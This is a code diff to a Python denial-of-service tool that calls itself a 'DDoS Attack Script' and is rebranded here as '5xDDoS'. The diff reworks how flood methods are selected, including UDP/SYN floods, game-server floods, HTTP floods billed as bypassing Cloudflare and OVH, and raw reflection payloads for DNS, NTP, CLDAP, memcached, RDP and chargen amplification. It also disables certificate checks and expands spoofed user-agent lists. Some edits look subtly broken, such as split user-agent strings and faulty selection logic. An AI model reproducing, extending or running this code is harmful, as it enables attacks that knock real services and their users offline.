@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+ 
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
@@ -10,7 +10,7 @@ from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
 from re import compile
-from secrets import choice as randchoice
+from random import choice as randchoice
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
@@ -39,13 +39,13 @@ from base64 import b64encode
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
-logger = getLogger("56DDoS")
+logger = getLogger("5xDDoS")
 logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 
-__version__: str = "2.3"
+__version__: str = "2.4 SNAPSHOT"
 __dir__: Path = Path(__file__).parent
 __ip__: Any = None
 tor2webs = [
@@ -393,6 +393,19 @@ class Layer4(Thread):
         if proxies:
             self._proxies = list(proxies)
 
+        self.methods = {
+            "UDP": self.UDP,
+            "SYN": self.SYN,
+            "VSE": self.VSE,
+            "TS3": self.TS3,
+            "MCPE": self.MCPE,
+            "FIVEM": self.FIVEM,
+            "MINECRAFT": self.MINECRAFT,
+            "CPS": self.CPS,
+            "CONNECTION": self.CONNECTION,
+            "MCBOT": self.MCBOT,
+        }
+
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
@@ -412,60 +425,6 @@ class Layer4(Thread):
         s.settimeout(.9)
         s.connect(self._target)
         return s
-
-    def select(self, name):
-        self.SENT_FLOOD = self.TCP
-        if name == "UDP": self.SENT_FLOOD = self.UDP
-        if name == "SYN": self.SENT_FLOOD = self.SYN
-        if name == "VSE": self.SENT_FLOOD = self.VSE
-        if name == "TS3": self.SENT_FLOOD = self.TS3
-        if name == "MCPE": self.SENT_FLOOD = self.MCPE
-        if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
-        if name == "ICMP":
-            self.SENT_FLOOD = self.ICMP
-            self._target = (self._target[0], 0)
-
-        if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
-        if name == "CPS": self.SENT_FLOOD = self.CPS
-        if name == "CONNECTION": self.SENT_FLOOD = self.CONNECTION
-        if name == "MCBOT": self.SENT_FLOOD = self.MCBOT
-
-        if name == "RDP":
-            self._amp_payload = (
-                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
-                3389)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "CLDAP":
-            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
-                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
-                                 389)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "MEM":
-            self._amp_payload = (
-                b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "CHAR":
-            self._amp_payload = (b'\x01', 19)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "ARD":
-            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "NTP":
-            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "DNS":
-            self._amp_payload = (
-                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
-                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
-                53)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
 
     def TCP(self) -> None:
         s = None
@@ -635,6 +594,52 @@ class Layer4(Thread):
             payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
         return payloads
 
+    def select(self, name):
+        self.SENT_FLOOD = self.TCP
+        for key, value in self.methods.items():
+            if name == key:
+                self.SENT_FLOOD = value
+            elif name == "ICMP":
+                self.SENT_FLOOD = self.ICMP
+                self._target = (self._target[0], 0)
+            elif name == "RDP":
+                self._amp_payload = (
+                    b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
+                    3389)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "CLDAP":
+                self._amp_payload = (
+                    b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
+                    b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
+                    389)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "MEM":
+                self._amp_payload = (
+                    b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "CHAR":
+                self._amp_payload = (b'\x01', 19)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "ARD":
+                self._amp_payload = (b'\x00\x14\x00\x00', 3283)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "NTP":
+                self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "DNS":
+                self._amp_payload = (
+                    b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
+                    b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
+                    53)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+
 
 # noinspection PyBroadException,PyUnusedLocal
 class HttpFlood(Thread):
@@ -673,6 +678,33 @@ class HttpFlood(Thread):
         if not self._target.host[len(self._target.host) - 1].isdigit():
             self._raw_target = (self._host, (self._target.port or 80))
 
+        self.methods = {
+            "POST": self.POST,
+            "CFB": self.CFB,
+            "CFBUAM": self.CFBUAM,
+            "XMLRPC": self.XMLRPC,
+            "BOT": self.BOT,
+            "APACHE": self.APACHE,
+            "BYPASS": self.BYPASS,
+            "DGB": self.DGB,
+            "OVH": self.OVH,
+            "AVB": self.AVB,
+            "STRESS": self.STRESS,
+            "DYN": self.DYN,
+            "SLOW": self.SLOW,
+            "GSB": self.GSB,
+            "RHEX": self.RHEX,
+            "STOMP": self.STOMP,
+            "NULL": self.NULL,
+            "COOKIE": self.COOKIES,
+            "TOR": self.TOR,
+            "EVEN": self.EVEN,
+            "DOWNLOADER": self.DOWNLOADER,
+            "BOMB": self.BOMB,
+            "PPS": self.PPS,
+            "KILLER": self.KILLER,
+        }
+
         if not referers:
             referers: List[str] = [
                 "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
@@ -687,13 +719,41 @@ class HttpFlood(Thread):
 
         if not useragents:
             useragents: List[str] = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 '
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ',
                 'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 '
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ',
                 'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 '
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ',
                 'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
+                'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
+                'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
+                'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
+                'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
+                'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
+                'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
             ]
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
@@ -712,6 +772,12 @@ class HttpFlood(Thread):
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
 
+    def select(self, name: str) -> None:
+        self.SENT_FLOOD = self.GET
+        for key, value in self.methods.items():
+            if name == key:
+                self.SENT_FLOOD = value
+                
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
@@ -849,10 +915,12 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def PPS(self) -> None:
+        payload: Any = str.encode(self._defaultpayload +
+                                  f"Host: {self._target.authority}\r\n\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, self._defaultpayload)
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def KILLER(self) -> None:
@@ -1161,56 +1229,6 @@ class HttpFlood(Thread):
                     break
         Tools.safe_close(s)
 
-    def select(self, name: str) -> None:
-        self.SENT_FLOOD = self.GET
-        if name == "POST":
-            self.SENT_FLOOD = self.POST
-        if name == "CFB":
-            self.SENT_FLOOD = self.CFB
-        if name == "CFBUAM":
-            self.SENT_FLOOD = self.CFBUAM
-        if name == "XMLRPC":
-            self.SENT_FLOOD = self.XMLRPC
-        if name == "BOT":
-            self.SENT_FLOOD = self.BOT
-        if name == "APACHE":
-            self.SENT_FLOOD = self.APACHE
-        if name == "BYPASS":
-            self.SENT_FLOOD = self.BYPASS
-        if name == "DGB":
-            self.SENT_FLOOD = self.DGB
-        if name == "OVH":
-            self.SENT_FLOOD = self.OVH
-        if name == "AVB":
-            self.SENT_FLOOD = self.AVB
-        if name == "STRESS":
-            self.SENT_FLOOD = self.STRESS
-        if name == "DYN":
-            self.SENT_FLOOD = self.DYN
-        if name == "SLOW":
-            self.SENT_FLOOD = self.SLOW
-        if name == "GSB":
-            self.SENT_FLOOD = self.GSB
-        if name == "RHEX":
-            self.SENT_FLOOD = self.RHEX
-        if name == "STOMP":
-            self.SENT_FLOOD = self.STOMP
-        if name == "NULL":
-            self.SENT_FLOOD = self.NULL
-        if name == "COOKIE":
-            self.SENT_FLOOD = self.COOKIES
-        if name == "TOR":
-            self.SENT_FLOOD = self.TOR
-        if name == "PPS":
-            self.SENT_FLOOD = self.PPS
-            self._defaultpayload = (
-                    self._defaultpayload +
-                    f"Host: {self._target.authority}\r\n\r\n").encode()
-        if name == "EVEN": self.SENT_FLOOD = self.EVEN
-        if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
-        if name == "BOMB": self.SENT_FLOOD = self.BOMB
-        if name == "KILLER": self.SENT_FLOOD = self.KILLER
-
 
 class ProxyManager:
 
@@ -1267,7 +1285,7 @@ class ToolsConsole:
 
     @staticmethod
     def runConsole():
-        cons = f"{gethostname()}@Tools:~#"
+        cons = f"{gethostname()}@5xDDoS:~#"
 
         while 1:
             cmd = input(cons + " ").strip()
@@ -1281,12 +1299,7 @@ class ToolsConsole:
                 print("Commands: HELP, CLEAR, BACK, EXIT")
                 continue
 
-            if (cmd == "E") or \
-                    (cmd == "EXIT") or \
-                    (cmd == "Q") or \
-                    (cmd == "QUIT") or \
-                    (cmd == "LOGOUT") or \
-                    (cmd == "CLOSE"):
+            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                 exit(-1)
 
             if cmd == "CLEAR":
@@ -1337,12 +1350,7 @@ class ToolsConsole:
                         if domain.upper() == "CLEAR":
                             print("\033c")
                             continue
-                        if (domain.upper() == "E") or \
-                                (domain.upper() == "EXIT") or \
-                                (domain.upper() == "Q") or \
-                                (domain.upper() == "QUIT") or \
-                                (domain.upper() == "LOGOUT") or \
-                                (domain.upper() == "CLOSE"):
+                        if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                             exit(-1)
                         if "/" not in domain: continue
                         logger.info("please wait ...")
@@ -1361,12 +1369,7 @@ class ToolsConsole:
                     if domain.upper() == "CLEAR":
                         print("\033c")
                         continue
-                    if (domain.upper() == "E") or \
-                            (domain.upper() == "EXIT") or \
-                            (domain.upper() == "Q") or \
-                            (domain.upper() == "QUIT") or \
-                            (domain.upper() == "LOGOUT") or \
-                            (domain.upper() == "CLOSE"):
+                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                         exit(-1)
                     domain = domain.replace('https://',
                                             '').replace('http://', '')
@@ -1395,12 +1398,7 @@ class ToolsConsole:
                     if domain.upper() == "CLEAR":
                         print("\033c")
                         continue
-                    if (domain.upper() == "E") or \
-                            (domain.upper() == "EXIT") or \
-                            (domain.upper() == "Q") or \
-                            (domain.upper() == "QUIT") or \
-                            (domain.upper() == "LOGOUT") or \
-                            (domain.upper() == "CLOSE"):
+                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                         exit(-1)
                     domain = domain.replace('https://',
                                             '').replace('http://', '')
@@ -1418,12 +1416,7 @@ class ToolsConsole:
                     if domain.upper() == "BACK": break
                     if domain.upper() == "CLEAR":
                         print("\033c")
-                    if (domain.upper() == "E") or \
-                            (domain.upper() == "EXIT") or \
-                            (domain.upper() == "Q") or \
-                            (domain.upper() == "QUIT") or \
-                            (domain.upper() == "LOGOUT") or \
-                            (domain.upper() == "CLOSE"):
+                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                         exit(-1)
 
                     domain = domain.replace('https://',
@@ -1450,8 +1443,8 @@ class ToolsConsole:
     @staticmethod
     def usage():
         print((
-                  '* 56DDoS - DDoS Attack Script With %d Methods\n'
-                  'Note: If the Proxy list is empty, the attack will run without proxies\n'
+                  '* 5xDDoS - DDoS Attack Script With %d Methods\n'
+                  'Note: If the Proxy list is empty, The attack will run without proxies\n'
                   '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                   '      Proxy Type 0 = All in config.json\n'
                   '      SocksTypes:\n'
@@ -1527,7 +1520,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
                 f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
             )
             Proxies = ProxyChecker.checkAll(
-                Proxies, timeout=1, threads=threads,
+                Proxies, timeout=5, threads=threads,
                 url=url.human_repr() if url else "http://httpbin.org/get",
             )
 
@@ -1606,7 +1599,7 @@ if __name__ == '__main__':
                             or bombardier_path.with_suffix('.exe').exists()
                     ), (
                         "Install bombardier: "
-                        "github.com/mariotrucco/bombardier"
+                        "https://www.google.com/search?q=BOMB-method"
                     )
 
                 if len(argv) == 9:
@@ -1656,7 +1649,7 @@ if __name__ == '__main__':
 
                 if method in Methods.LAYER4_AMP:
                     logger.warning("this method need spoofable servers please check")
-                    logger.warning("github.com/Phenomite/AMP-Research")
+                    logger.warning("https://www.google.com/search?q=Amplification-ddos-attack")
 
                 threads = int(argv[3])
                 timer = int(argv[4])
